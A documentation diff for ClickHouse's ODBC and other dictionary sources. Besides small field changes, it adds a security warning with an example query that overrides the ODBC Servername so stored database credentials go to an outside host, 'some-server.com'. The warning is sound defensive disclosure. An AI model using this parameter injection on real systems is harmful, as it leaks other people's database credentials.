@@ -111,7 +111,7 @@ Example of settings:
 ```xml
 <odbc>
     <db>DatabaseName</db>
-    <table>TableName</table>
+    <table>ShemaName.TableName</table>
     <connection_string>DSN=some_parameters</connection_string>
     <invalidate_query>SQL_QUERY</invalidate_query>
 </odbc>
@@ -120,9 +120,39 @@ Example of settings:
 Setting fields:
 
 - `db` – Name of the database. Omit it if the database name is set in the `<connection_string>` parameters.
-- `table` – Name of the table.
+- `table` – Name of the table and schema if exists.
 - `connection_string` – Connection string.
 - `invalidate_query` – Query for checking the dictionary status. Optional parameter. Read more in the section [Updating dictionaries](external_dicts_dict_lifetime.md#dicts-external_dicts_dict_lifetime).
+
+ClickHouse receives quoting symbols from ODBC-driver and quote all settings in queries to driver, so it's necessary to set table name accordingly to table name case in database.
+
+### Known vulnerability of the ODBC dictionary functionality
+
+!!! attention
+    When connecting to the database through the ODBC driver connection parameter `Servername` can be substituted. In this case values of `USERNAME` and `PASSWORD` from `odbc.ini` are sent to the remote server and can be compromised.
+
+**Example of insecure use**
+
+Let's configure unixODBC for PostgreSQL. Content of `/etc/odbc.ini`:
+
+```
+[gregtest]
+Driver = /usr/lib/psqlodbca.so
+Servername = localhost
+PORT = 5432
+DATABASE = test_db
+#OPTION = 3
+USERNAME = test
+PASSWORD = test
+```
+
+If you then make a query such as
+
+```
+SELECT * FROM odbc('DSN=gregtest;Servername=some-server.com', 'test_db');    
+```
+
+ODBC driver will send values of `USERNAME` and `PASSWORD` from `odbc.ini` to `some-server.com`.
 
 ### Example of Connecting PostgreSQL
 
@@ -370,6 +400,7 @@ Setting fields:
 - `db` – Name of the database.
 - `table` – Name of the table.
 - `where ` – The selection criteria. May be omitted.
+- `invalidate_query` – Query for checking the dictionary status. Optional parameter. Read more in the section [Updating dictionaries](external_dicts_dict_lifetime.md#dicts-external_dicts_dict_lifetime).
 
 <a name="dicts-external_dicts_dict_sources-mongodb"></a>
 
@@ -398,3 +429,5 @@ Setting fields:
 - `password` – Password of the MongoDB user.
 - `db` – Name of the database.
 - `collection` – Name of the collection.
+
+[Original article](https://clickhouse.yandex/docs/en/query_language/dicts/external_dicts_dict_sources/) <!--hide-->
